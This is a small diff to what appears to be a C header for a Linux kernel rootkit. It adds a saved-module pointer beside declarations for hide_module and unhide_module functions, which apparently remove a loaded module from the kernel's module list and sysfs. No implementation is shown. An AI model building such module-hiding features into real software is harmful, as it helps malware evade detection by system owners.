@@ -7,6 +7,7 @@
 
 extern struct list_head list_head_saved;
 extern struct module_kobject mkobj_saved;
+extern struct list_head *module_previous;
 
 void hide_module(int *hidden_flag);
 void unhide_module(int *hidden_flag);
